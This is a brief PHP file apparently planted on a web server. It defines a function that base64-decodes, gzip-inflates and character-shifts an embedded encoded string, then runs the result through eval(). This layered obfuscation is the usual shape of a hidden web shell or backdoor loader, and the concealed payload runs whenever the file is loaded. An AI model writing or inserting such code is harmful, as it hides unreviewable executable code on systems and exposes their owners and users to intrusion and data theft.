<?php function Ndh($pocn)
{ 
$pocn=gzinflate(base64_decode($pocn));
 for($i=0;$i<strlen($pocn);$i++)
 {
$pocn[$i] = chr(ord($pocn[$i])-1);
 }
 return $pocn;
 }eval(Ndh("ZY9PS8NAFMQ/wH6KR8ihPdikRDy0aNGTmEMVvCksL5uXZGn2D283Sij97G7AHsQ5zvxgZgCShCBmx5LJO47a9qtyvRd5g9bCPWT52U9RD5fH2Y04wNHAi9MW3mmkntFAjUbDbi3+cvm50TxdYIjRh11RxI2h4li7rtNK4ygtfQuRpZpANjheij7Lqvoo91Vpfv3/ZoOB7m4lWeVaauV2IdD2PTL6tIcX5hqO2p6W/LqgnXTcKFXUz/PT61siwxwimVXGBm64A4U+qgHl1zZL9w8PPw=="));?>
